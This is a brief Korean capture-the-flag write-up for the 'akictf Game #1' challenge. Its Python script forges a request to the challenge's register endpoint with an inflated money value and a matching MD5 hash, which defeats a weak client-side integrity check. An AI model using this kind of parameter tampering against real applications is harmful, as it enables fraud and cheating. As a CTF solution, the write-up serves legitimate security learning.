# [akictf] Game #1 - Writeup

`money`를 조작해주면 된다.

``` python
import urllib.parse, urllib.request
import hashlib

def main():
	money = '999999999999'
	url = 'http://q6.ctf.katsudon.org/register'
	post_data = {
		'h':hashlib.md5(money.encode()).hexdigest(),
		'money':money
	}
	headers = {
		'Cookie':'PHPSESSID=**secret**',
		'Content-Type':'application/x-www-form-urlencoded'
	}
	req = urllib.request.Request(
		url, 
		urllib.parse.urlencode(post_data).encode(), 
		headers
	)
	res = urllib.request.urlopen(req).read().decode()

	print(res)

if __name__ == '__main__':
	main()
```